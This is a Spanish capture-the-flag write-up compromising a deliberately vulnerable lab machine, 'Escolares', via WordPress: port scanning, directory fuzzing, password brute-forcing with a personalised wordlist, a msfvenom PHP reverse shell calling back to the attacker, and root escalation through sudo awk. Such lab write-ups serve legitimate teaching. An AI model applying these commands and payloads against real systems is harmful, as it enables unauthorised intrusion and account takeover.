# Escolares

* Máquina **atacante** -> 172.17.0.1
* Máquina **objetivo** -> 172.17.0.2 | Linux :penguin:

### Escaneo de puertos

Realizamos un escaneo de puertos con *nmap* para ver puertos abiertos de la máquina **objetivo**:
```shell
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```
![escan](/Capturas/2024-12-13_17-37.png)

Encontramos abiertos los puertos **22** y **80**.

Al ver lo que tenemos corriendo por el puerto **80**, observamos una página web de una universidad de ciberseguridad sin nada interesante al echarle un vistazo por encima:

![uniciber](/Capturas/2024-12-13_17-42.png)

Al mirar el código fuente de la página, encontramos comentado lo que puede ser un directorio interesante:

![comment](/Capturas/2024-12-13_17-42_1.png)

Cuando entramos en ese directorio, encontramos información que nos puede servir más adelante:

![prof](/Capturas/2024-12-13_17-45.png)

### Fuzzing web

Buscamos más directorios que nos puedan facilitar la intrusión a la máquina **objetivo**. Para ello, hacemos **fuzzing web** con *gobuster*:
```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.py,.php,.sh
```
![fuzz](/Capturas/2024-12-13_18-13.png)

Encontramos que hay un **wordpress** corriendo, así que realizamos **fuzzing web** de *172.17.0.2/wordpress* para ver si podemos acceder a él de alguna manera:
```shell
gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.py,.php,.sh
```

### Wordpress

Antes de seguir investigando el **wordpress**, para que podamos ver la página en condiciones, necesitamos apuntar a **escolares.dl** en */etc/hosts*:

![etchosts](/Capturas/2024-12-13_18-32.png)

Ahora, si nos vamos a la página principal, vemos que se ve perfectamente:

![pagprin](/Capturas/2024-12-13_18-35.png)

Ya podemos volver a los resultados de *gobuster* sobre wordpress, y ver si hay algo interesante. Si accedemos a *172.17.0.2/wp-login.php* descubrimos un panel de login de wordpress:

![login](/Capturas/2024-12-13_18-43.png)

Teniendo esto delante, vamos a buscar usuarios con *wpscan*:
```shell
wpscan --url http://172.17.0.2/wordpress --enumerate u,vp
```
![wpscan](/Capturas/2024-12-13_18-45.png)

Nos detecta la existencia del usuario **luisillo**, que es el mismo que encontramos en */profesores.html*. Por lo que viendo la relación, crearemos un diccionario con *cupp* de toda la información de Luis proporcionada en esa dirección y probaremos a realizar un ataque de fuerza bruta de contraseñas:
```shell
cupp -i
```
![cupp](/Capturas/2024-12-13_18-48.png)

Una vez tenemos el diccionario, realizamos el ataque de fuerza bruta al panel de login otra vez, pero sobre la contraseña:
```shell
wpscan --url http://172.17.0.2/wordpress --passwords luis.txt --usernames luisillo
```
![luisillocomunica](/Capturas/2024-12-13_18-50.png)

Como resultado, tenemos el usuario **luisillo** con contraseña **Luis1981**.

Al entrar al **wordpress** como admin, nos fijamos que hay un plugin llamado **WP File Manager** que nos permite subir archivos. Por lo que nos colocamos en el directorio */wordpress/wp-content/uploads* y subimos un archivo malicioso que crearemos con *msfvenom* con el que nos haremos una **reverse shell** mientras nos ponemos a la escucha con *netcat*:
```shell
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > payload.php
```
```shell
nc -nlvp 443
```
![uploads](/Capturas/2024-12-13_18-54.png)

Cuando ya está subido, nos vamos al directorio *172.17.0.2/wordpress/wp-content/uploads* y ejecutamos el archivo:

![archivo](/Capturas/2024-12-13_18-58.png)

![conexxion](/Capturas/2024-12-13_18-59.png)

Estabilizamos la conexión y realizamos un tratamiento de la tty.

### Escalada de privilegios

Investigamos todos los directorios a los que tenemos acceso con el usuario que tenemos (www-data). Hasta que encontramos un archivo sospechoso llamado **secret.txt** en */home* que contiene lo que parece la contraseña del usuario **luisillo**:

![secret](/Capturas/2024-12-13_19-03.png)

Así que probamos a entrar a dicho usuario con la contraseña proporcionada:

![su](/Capturas/2024-12-13_19-04.png)

Ahora realizamos un **sudo -l** para ver si podemos ejecutar algo como algun usuario con permisos superiores:

![sudo-l](/Capturas/2024-12-13_19-06.png)

Podemos ejecutar **awk** como **root**, por lo que escalaremos privilegios a través de él con el comando:
```shell
sudo awk 'BEGIN {system("/bin/sh")}'
```
![root](/Capturas/2024-12-13_19-07.png)

Somos root! :triangular_flag_on_post: